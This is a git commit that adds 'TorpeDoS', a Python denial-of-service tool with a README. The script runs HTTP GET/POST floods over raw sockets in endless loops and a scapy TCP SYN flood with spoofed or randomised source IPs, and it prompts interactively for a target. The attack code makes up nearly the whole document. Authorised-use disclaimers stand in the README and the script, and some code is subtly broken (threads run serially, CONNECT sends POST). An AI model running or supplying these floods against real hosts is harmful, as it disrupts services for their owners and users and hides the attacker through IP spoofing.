4e62621a2ee1d4b48a69e381adb86af9853fe2e2
Mohammed Alhassan <xxm37xx@gmail.com>
2023-09-16 00:08:35 +0300

    initial commit

---
+++ README.md
@@ -0,0 +1,45 @@
+# TorpeDoS
+
+![TorpeDoS](img/TorpeDoS.png)
+
+## Description
+
+**Note: Unauthorized use of DoS attacks is illegal and can cause harm to networks and systems. Use this tool responsibly and with proper authorization.**
+
+TorpeDoS is a Denial of Service (DoS) tool developed in Python for testing purposes. It is designed to flood a target server with a high volume of requests, thereby overwhelming its resources. This tool should only be used with proper authorization and for responsible testing purposes.
+
+## Prerequisites
+
+- Python 3.x
+- scapy
+- colorama
+- termcolor
+- pyfiglet
+
+## Usage
+
+To execute an attack, run the TorpeDoS script as a super user (sudo) and follow the prompts. The tool currently supports the following types of DoS attacks:
+
+1. **HTTP Flood Attack:** Launches a flood of HTTP requests to overwhelm the target web server. It supports HTTP methods such as GET, POST, and CONNECT.
+<br>
+![HTTPFlood](img/httpf.png)
+
+2. **TCP SYN Flood Attack:** Floods the target with a large number of TCP connection requests, exhausting server resources.
+<br>
+![TCPSYNFlood](img/tcpsf.png)
+
+## Installation
+
+1. Clone the repository:
+<br>
+``` git clone https://github.com/M-Alhassan/TorpeDoS.git ```
+
+2. Install the required dependencies:
+<br>
+``` pip install scapy colorama termcolor pyfiglet ```
+
+
+## Author
+
+| [<img src="https://github.com/M-Alhassan.png?size=115" width="115"><br><sub>@M-Alhassan</sub>](https://github.com/M-Alhassan) |
+| :---------------------------------------------------------------------------------------------------------------------------: |# TorpeDoS
---
+++ torpedos.py
@@ -0,0 +1,140 @@
+import socket
+import threading
+import random
+from scapy.all import send, IP, TCP
+
+# ====================== Header Art ==========================
+import sys
+from colorama import init
+from termcolor import cprint
+from pyfiglet import figlet_format
+init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
+cprint(figlet_format('TorpeDoS'),'blue', attrs=['bold'])
+# ====================== Header Art ==========================
+
+# ======================== Details ===========================
+print('\nDenial of Service (DoS) Tool')
+print('\nCopyright (c) github.com/M-Alhassan')
+print('\nDisclaimer: This tool is intended for authorized and responsible use only. Do not use this tool to launch Denial of Service attacks against any network or system without proper authorization. Unauthorized use of this tool may violate local, national, and international laws.')
+print('\nMake sure to run using highest privileges (sudo)')
+print('')
+# ======================== Details ===========================
+
+# Help prompt
+def help():
+      print('\nUsage:')
+      print('  -httpf       Launch an HTTP flood attack')
+      print('  -tcpsf       Launch a TCP SYN flood attack (coming soon)')
+      print('  -h, -help    Show this help message')
+      print('  exit         Terminate the program')
+      print('\nTypes of DoS Attacks:')
+      print('  1. HTTP Flood Attack:')
+      print('     - Launches a flood of HTTP requests to overwhelm the target web server.')
+      print('     - Floods the target with a high volume of HTTP GET or POST requests, consuming server resources.')
+      print('     - Often involves the use of multiple attacking devices or botnets to generate a massive request traffic.')
+      print('     - The requests are as follows: <METHOD>/<path><ip_address> HTTP/1.1')
+      print('     - HTTP methods supported (GET, POST, CONNECT)')
+      print('  2. TCP SYN Flood Attack:')
+      print('     - Floods the target with a large number of TCP connection requests, exhausting server resources.')
+      print('     - Sends a flood of TCP SYN packets to overwhelm the target, preventing legitimate connections from being established.')
+      print('     - Can lead to a complete denial of service, making the server unresponsive to all connection attempts.')
+      print('  Note: Unauthorized use of DoS attacks is illegal and can cause harm to networks and systems. Use this tool responsibly and with proper authorization.')
+
+# Generate random IP address
+def random_IP():
+   ip = ".".join(map(str,(random.randint(0,255) for i in range (4))))
+   return ip
+
+# HTTP Flood Attack
+def http_flood_attack(target_ip, target_port, target_path, spoofed_ip, method):
+   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
+
+   # GET Request DoS attack
+   if (method == "GET"):
+      try:
+         while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(("GET /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+            s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
+            s.close()
+      except Exception as e:
+         print('Error: ', e)
+
+   # POST Request DoS attack
+   if (method == "POST"):
+      try:
+         while True:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target_ip, target_port))
+            s.sendto(("POST /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+            s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
+            s.close()
+      except Exception as e:
+         print('Error: ', e)
+
+   # CONNECT Reqeust DoS attack
+   if (method == "CONNECT"):
+         try:
+            while True:
+               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+               s.connect((target_ip, target_port))
+               s.sendto(("POST /" + target_path + target_ip  + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
+               s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
+               s.close()
+         except Exception as e:
+            print('Error: ', e)
+
+def tcp_syn_flood_attack(target_ip, destination_port, spoofed_ip, num_packets):
+   max_ports = 65535
+   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
+   for i in range(num_packets):
+      seq_n = random.randint(0, max_ports)
+      sPort = random.randint(0, max_ports)
+      window = random.randint(0, max_ports)
+      if (spoofed_ip == "rand"):
+         src_ip = random_IP()
+      else:
+         src_ip = spoofed_ip
+      packet = IP(dst=target_ip, src=src_ip)/TCP(sport=sPort, dport=destination_port, flags="S", seq=seq_n, window=window)
+      send(packet, verbose=0)
+   print('\nAll packets have been sent')
+
+# Prompt
+while True:
+   print('\nExecute an attack or type -h or -help for help:')
+   user_input = input("> ")
+   if user_input == "-httpf":
+      try:
+         target_ip = input('Enter target IP: ')
+         target_port = int(input ('Enter target port: '))
+         method = input('Enter HTTP method: ')
+         target_path = input('Enter the target\'s url path: ')
+         spoofed_ip = input('Enter the spoofed IP: ')
+         for i in range(500):
+            thread = threading.Thread(target=http_flood_attack(target_ip, target_port, target_path, spoofed_ip, method))
+            thread.start()    
+      except KeyboardInterrupt:
+         print(' Attack Stopped')
+      except Exception as e:
+         print(e)
+
+   elif user_input == "-tcpsf":
+      try:
+         target_ip = input('Enter target IP: ')
+         target_port = int(input ('Enter target port: '))
+         spoofed_ip = input('Enter spoofed IP or type (rand) for random IPs: ')
+         num_packets = int(input('Enter number of packets to send: '))
+         tcp_syn_flood_attack(target_ip, target_port, spoofed_ip, num_packets)   
+      except KeyboardInterrupt:
+         print(' Attack Stopped')
+      except Exception as e:
+         print(e)
+
+   elif user_input == "-h" or user_input == "-help":
+      help()
+   elif user_input == "exit":
+      print('\nTerminating program...')
+      sys.exit()
+   else:
+      print('\nInvalid input')
